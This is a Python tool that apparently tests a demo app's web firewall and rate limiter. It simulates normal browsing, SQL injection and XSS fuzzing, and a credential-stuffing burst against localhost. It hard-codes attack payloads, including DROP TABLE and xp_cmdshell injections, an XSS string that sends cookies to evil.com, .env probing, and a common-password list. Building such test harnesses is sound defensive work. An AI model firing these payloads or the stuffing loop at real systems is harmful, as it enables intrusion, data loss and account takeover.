#!/usr/bin/env python3
"""
AegisFlow Attack Simulator
===========================

CLI tool to simulate 3 attack modes against the VaultStore target app:
  --mode clean     Normal browsing (GETs to products, human-paced delays)
  --mode recon     Reconnaissance + SQLi/XSS fuzzing (triggers blocks)
  --mode carding   Rapid credential-stuffing burst (triggers rate limiter)

Usage:
  python attackSimulator.py --mode clean
  python attackSimulator.py --mode recon
  python attackSimulator.py --mode carding
  python attackSimulator.py --mode clean --target http://localhost:3000

Requires: aiohttp, rich
  pip install -r requirements.txt
"""

import argparse
import asyncio
import random
import time
import sys

import aiohttp
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich.panel import Panel
from rich.layout import Layout

console = Console()

# ============================================================
# Attack Payloads
# ============================================================

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM users --",
    "1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    "admin'--",
    "' OR 'x'='x",
    "1; EXEC xp_cmdshell('whoami')--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    "javascript:alert('XSS')",
    '<svg onload=alert(1)>',
    '<body onload=alert("xss")>',
    "';alert(String.fromCharCode(88,83,83))//",
    '<iframe src="javascript:alert(1)">',
]

RECON_PATHS = [
    "/.env",
    "/admin/config",
    "/api/v1/kyc/biometric-vault",
    "/api/v1/kyc/credit-profiles",
    "/api/v1/kyc/biometric-vault?id=' OR 1=1 --",
    "/api/v1/kyc/credit-profiles?filter=<script>alert(1)</script>",
    "/.env?backup=true",
    "/admin/config?debug=true&token=' UNION SELECT * FROM users--",
    "/api/v1/kyc/biometric-vault?search=' UNION SELECT username,password FROM users--",
    "/api/v1/products?search=<img src=x onerror=alert(document.cookie)>",
]

CLEAN_PATHS = [
    "/api/v1/products",
    "/api/v1/products?page=1&limit=6",
    "/api/v1/products?page=2&limit=6",
    "/api/v1/products?search=vault",
    "/api/v1/products?search=vpn",
    "/api/v1/products?category=network-security",
    "/api/v1/products?category=identity-management",
    "/api/v1/products/prod-001",
    "/api/v1/products/prod-003",
    "/api/v1/products/prod-005",
    "/api/v1/products/prod-008",
    "/api/v1/products/prod-012",
    "/health",
]

CARDING_EMAILS = [
    "admin@vaultstore.io",
    "test@test.com",
    "alice@example.com",
    "bob@example.com",
    "root@localhost",
    "admin@admin.com",
    "user@user.com",
    "info@company.com",
    "support@vaultstore.io",
    "john.doe@gmail.com",
    "jane.smith@yahoo.com",
    "hacker@evil.com",
    "phish@bait.net",
    "brute@force.io",
    "script@kiddie.xyz",
    "pentester@sec.io",
    "red@team.org",
    "blue@team.org",
    "demo@demo.com",
    "a@b.com",
    "1@2.com",
    "x@y.z",
    "null@void.dev",
    "drop@table.sql",
    "' OR 1=1 --@evil.com",
]

PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome",
    "password123", "qwerty", "abc123", "monkey", "master",
    "dragon", "login", "princess", "football", "shadow",
    "sunshine", "trustno1", "iloveyou", "batman", "access",
]

# ============================================================
# Results tracking
# ============================================================

results = []

def status_color(code):
    if code == 200:
        return "green"
    elif code == 403:
        return "red"
    elif code == 429:
        return "yellow"
    elif code == 401:
        return "dim yellow"
    else:
        return "white"

def build_table():
    table = Table(
        title="🛡 AegisFlow Attack Simulator",
        title_style="bold cyan",
        border_style="dim",
        show_lines=False,
        padding=(0, 1),
        expand=True,
    )
    table.add_column("#", style="dim", width=4, justify="right")
    table.add_column("Method", style="bold", width=6)
    table.add_column("Path", style="cyan", max_width=55, no_wrap=True, overflow="ellipsis")
    table.add_column("Status", justify="center", width=8)
    table.add_column("Time", justify="right", width=8)
    table.add_column("Result", width=14)

    # Show last 25 results
    for i, r in enumerate(results[-25:], start=max(1, len(results) - 24)):
        sc = r["status"]
        color = status_color(sc)
        status_text = Text(str(sc), style=f"bold {color}")

        if sc == 200:
            result_text = Text("✓ PASSED", style="green")
        elif sc == 403:
            result_text = Text("✕ BLOCKED", style="bold red")
        elif sc == 429:
            result_text = Text("⏱ RATE-LIM", style="bold yellow")
        elif sc == 401:
            result_text = Text("⚠ UNAUTH", style="yellow")
        else:
            result_text = Text(f"? {sc}", style="white")

        table.add_row(
            str(i),
            r["method"],
            r["path"][:55],
            status_text,
            f"{r['elapsed']:.0f}ms",
            result_text,
        )

    return table

def build_summary():
    total = len(results)
    passed = sum(1 for r in results if r["status"] == 200)
    blocked = sum(1 for r in results if r["status"] == 403)
    rate_limited = sum(1 for r in results if r["status"] == 429)
    unauthorized = sum(1 for r in results if r["status"] == 401)
    other = total - passed - blocked - rate_limited - unauthorized

    return Panel(
        f"[bold]Total:[/] {total}  "
        f"[green]Passed:[/] {passed}  "
        f"[red]Blocked:[/] {blocked}  "
        f"[yellow]Rate-Limited:[/] {rate_limited}  "
        f"[dim yellow]Unauthorized:[/] {unauthorized}  "
        f"[white]Other:[/] {other}",
        title="Summary",
        border_style="dim",
    )

# ============================================================
# HTTP helpers
# ============================================================

async def do_get(session, base_url, path):
    url = f"{base_url}{path}"
    start = time.monotonic()
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            elapsed = (time.monotonic() - start) * 1000
            return {"method": "GET", "path": path, "status": resp.status, "elapsed": elapsed}
    except Exception as e:
        elapsed = (time.monotonic() - start) * 1000
        return {"method": "GET", "path": path, "status": 0, "elapsed": elapsed, "error": str(e)}

async def do_post(session, base_url, path, body):
    url = f"{base_url}{path}"
    start = time.monotonic()
    try:
        async with session.post(url, json=body, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            elapsed = (time.monotonic() - start) * 1000
            return {"method": "POST", "path": path, "status": resp.status, "elapsed": elapsed}
    except Exception as e:
        elapsed = (time.monotonic() - start) * 1000
        return {"method": "POST", "path": path, "status": 0, "elapsed": elapsed, "error": str(e)}

# ============================================================
# Attack Modes
# ============================================================

async def mode_clean(base_url, live):
    """Simulate normal browsing — human-paced GETs to products."""
    console.print("\n[bold green]🟢 Mode: CLEAN — Simulating normal user browsing[/]\n")

    async with aiohttp.ClientSession() as session:
        for i in range(20):
            path = random.choice(CLEAN_PATHS)
            result = await do_get(session, base_url, path)
            results.append(result)
            live.update(build_table())

            # Human-paced delay: 0.5–3 seconds
            delay = random.uniform(0.5, 3.0)
            await asyncio.sleep(delay)


async def mode_recon(base_url, live):
    """Fuzz honeypot and sensitive endpoints with SQLi/XSS payloads."""
    console.print("\n[bold red]🔴 Mode: RECON — Fuzzing with SQLi/XSS payloads[/]\n")

    attack_requests = []

    # Direct honeypot/sensitive path hits
    for path in RECON_PATHS:
        attack_requests.append(("GET", path, None))

    # SQLi in query params against various endpoints
    for payload in SQLI_PAYLOADS:
        target = random.choice([
            "/api/v1/products",
            "/api/v1/kyc/biometric-vault",
            "/api/v1/kyc/credit-profiles",
        ])
        attack_requests.append(("GET", f"{target}?search={payload}", None))

    # XSS in query params
    for payload in XSS_PAYLOADS:
        target = random.choice([
            "/api/v1/products",
            "/api/v1/kyc/biometric-vault",
        ])
        attack_requests.append(("GET", f"{target}?q={payload}", None))

    # Shuffle for realism
    random.shuffle(attack_requests)

    async with aiohttp.ClientSession() as session:
        for method, path, body in attack_requests:
            if method == "GET":
                result = await do_get(session, base_url, path)
            else:
                result = await do_post(session, base_url, path, body)

            results.append(result)
            live.update(build_table())

            # Fast but not instant — 0.1–0.5s between requests
            await asyncio.sleep(random.uniform(0.1, 0.5))


async def mode_carding(base_url, live):
    """Rapid credential-stuffing burst — 25+ login attempts in seconds."""
    console.print("\n[bold yellow]🟡 Mode: CARDING — Credential stuffing burst[/]\n")

    async with aiohttp.ClientSession() as session:
        # Fire 25 login attempts as fast as possible
        tasks = []
        for i in range(25):
            email = random.choice(CARDING_EMAILS)
            password = random.choice(PASSWORDS)
            body = {"email": email, "password": password}

            async def fire(b=body):
                result = await do_post(session, base_url, "/api/v1/auth/login", b)
                results.append(result)
                live.update(build_table())

            tasks.append(fire())

            # Tiny stagger so we can see them appear in sequence
            await asyncio.sleep(0.05)

        await asyncio.gather(*tasks)

        # Follow up with a few more at slightly slower pace
        for i in range(10):
            email = random.choice(CARDING_EMAILS)
            password = random.choice(PASSWORDS)
            result = await do_post(session, base_url, "/api/v1/auth/login", {"email": email, "password": password})
            results.append(result)
            live.update(build_table())
            await asyncio.sleep(random.uniform(0.1, 0.3))

# ============================================================
# Main
# ============================================================

async def main():
    parser = argparse.ArgumentParser(
        description="AegisFlow Attack Simulator — test security responses",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  clean    Normal browsing — should see all 200s
  recon    SQLi/XSS fuzzing — should see 403 blocks
  carding  Credential stuffing — should see 429 rate-limits

Example:
  python attackSimulator.py --mode recon --target http://localhost:3000
        """,
    )
    parser.add_argument(
        "--mode",
        required=True,
        choices=["clean", "recon", "carding"],
        help="Attack mode to simulate",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:3000",
        help="Target base URL (default: http://localhost:3000)",
    )

    args = parser.parse_args()

    console.print(Panel(
        f"[bold]Target:[/] {args.target}\n[bold]Mode:[/] {args.mode}",
        title="🛡 AegisFlow Attack Simulator",
        border_style="cyan",
    ))

    mode_fn = {
        "clean": mode_clean,
        "recon": mode_recon,
        "carding": mode_carding,
    }[args.mode]

    with Live(build_table(), console=console, refresh_per_second=8, transient=False) as live:
        await mode_fn(args.target, live)

    # Final summary
    console.print()
    console.print(build_summary())
    console.print()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[dim]Interrupted — exiting.[/]")
        sys.exit(0)
